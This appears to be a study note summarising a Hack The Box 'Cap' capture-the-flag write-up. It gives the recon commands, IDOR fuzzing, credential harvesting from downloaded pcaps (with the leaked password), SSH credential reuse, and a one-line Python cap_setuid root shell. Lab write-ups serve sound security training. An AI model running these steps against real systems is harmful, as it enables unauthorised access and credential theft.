---
type: machine
platform: hack-the-box
difficulty: easy
ip: 10.129.148.255
cves: []
tools: [nmap, gobuster, ffuf, ssh]
techniques: [information-gathering, directory-fuzzing, broken-access-control, hardcoded-credentials, pcap-analysis, linux-capabilities]
tags: [ejpt:assessment, ejpt:web-pentest, ejpt:host-net-pentest]
related: ["[[broken-access-control]]", "[[linux-capabilities]]", "[[pcap-analysis]]", "[[hack-the-box]]"]
---

# Cap

**Writeup:** [raw writeup](../../writeups/hack-the-box/easy/cap.md)

Easy HTB box: an authenticated security dashboard exposes other users' network captures via sequential IDs (IDOR) → `strings` on a downloaded pcap leaks FTP credentials → same password on FTP (user flag) and SSH → root via `python3.8` `cap_setuid`.

## Path

1. **Recon** — `ping -c 2` (TTL 63 → Linux) then `sudo nmap -sS -p- --open -Pn -n` → `21/tcp` (vsftpd 3.0.3), `22/tcp` (OpenSSH 8.2p1 Ubuntu), `80/tcp`; deep scan `-sS -sCV -p21,22,80` → HTTP title **Security Dashboard** on Gunicorn ([[information-gathering]]).
2. **Web enum** — `whatweb` fingerprints Bootstrap/jQuery 2.2.4; `gobuster dir` → `data` (302), `ip` (200), `netstat` (200), `capture` (302 → `http://IP/data/1`) — the redirect target leaks the object-ID format ([[directory-fuzzing]]).
3. **IDOR** — the dashboard logs you in as *Nathan* and the capture feature redirects to `/data/<id>`; the ID is client-supplied and never authorized server-side. Fuzz the ID space: `ffuf -u http://IP/data/FUZZ -w 3-digits-000-999.txt -fc 302` → `000`, `001` return 200 ([[broken-access-control]]).
4. **Credential theft from captures** — `wget http://IP/download/0 && strings 0 | grep -E 'USER|PASS'` → FTP traffic in cleartext: `USER nathan` / `PASS Buck3tH4TF0RM3!` ([[hardcoded-credentials]], [[pcap-analysis]]).
5. **FTP** — login as `nathan` → `user.txt`.
6. **SSH** — the same credentials work: `ssh nathan@10.129.148.255`.
7. **Privesc** — `getcap -r / 2>/dev/null` → `/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip`; system Python with `cap_setuid` is a root shell factory ([[linux-capabilities]]).
8. **Root** — `python3 -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'` → `whoami` = **root** → `/root/root.txt`.

## Credentials / secrets

| Item | Value |
|------|-------|
| `nathan` (FTP + SSH) | `Buck3tH4TF0RM3!` (from pcap capture `0`) |

## Takeaways

- **An object ID in the URL is an authorization decision you can test.** `/data/<id>` → fuzz `/data/000-999`, and the `302 → /data/1` redirect from gobuster had already told you the format ([[broken-access-control]]).
- **Any downloadable pcap is a credential source.** FTP/HTTP basic auth land in captures in cleartext — `strings <file> | grep -E 'USER|PASS'` is the whole exploit ([[hardcoded-credentials]]).
- **One leak, two footholds:** the captured password worked on FTP *and* SSH — always replay stolen credentials across every open service ([[information-gathering]]).
- **`getcap -r /` before `find -perm -4000`:** capabilities hide on stock binaries (`/usr/bin/python3.8`), which SUID hunting would never flag — and `cap_setuid` on the interpreter gives root in one line ([[linux-capabilities]]).
